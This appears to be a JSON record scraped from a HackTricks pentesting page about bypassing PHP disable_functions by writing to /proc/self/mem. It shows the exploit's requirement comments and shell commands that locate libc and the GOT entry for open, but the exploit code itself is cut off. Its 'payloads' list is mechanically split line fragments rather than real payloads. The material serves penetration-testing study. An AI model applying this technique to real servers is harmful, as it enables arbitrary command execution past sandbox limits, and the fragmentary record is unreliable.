{
  "id": "network_services_pentesting_280980858707",
  "category": "network-services-pentesting",
  "title": "disable functions bypass via mem",
  "description": "# via mem\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\n```php\n<?php\n/*\n1. kernel>=2.68\n2\uff09PHP-CGI or PHP-FPM\uff09\u56e0\u4e3amod_php\u5e76\u6ca1\u6709\u8bfb\u53d6/proc/self/mem\n3\uff09\u4ee3\u7801\u9488\u5bf9x64\u7f16\u5199\uff0c\u8981\u7528\u4e8ex32\u9700\u8981\u66f4\u6539\n4\uff09Open_basedir=off\uff08\u6216\u8005\u80fd\u7ed5\u8fc7open_basedir\u8bfb\u5199 /lib/ \u548c/proc/\uff09\n*/\n/*\n$libc_ver:\nbeched@linuxoid ~ $ php -r 'readfile(\"/proc/self/maps\");' | grep libc\n7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386",
  "payloads": [
    "# via mem",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)",
    "```php",
    "1. kernel>=2.68",
    "2\uff09PHP-CGI or PHP-FPM\uff09\u56e0\u4e3amod_php\u5e76\u6ca1\u6709\u8bfb\u53d6/proc/self/mem",
    "3\uff09\u4ee3\u7801\u9488\u5bf9x64\u7f16\u5199\uff0c\u8981\u7528\u4e8ex32\u9700\u8981\u66f4\u6539",
    "4\uff09Open_basedir=off\uff08\u6216\u8005\u80fd\u7ed5\u8fc7open_basedir\u8bfb\u5199 /lib/ \u548c/proc/\uff09",
    "$libc_ver:",
    "beched@linuxoid ~ $ php -r 'readfile(\"/proc/self/maps\");' | grep libc",
    "7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so",
    "$open_php:",
    "beched@linuxoid ~ $ objdump -R /usr/bin/php | grep '\\sopen$'",
    "0000000000e94998 R_X86_64_JUMP_SLOT  open",
    "$system_offset and $open_offset:"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-via-mem.md"
  ]
}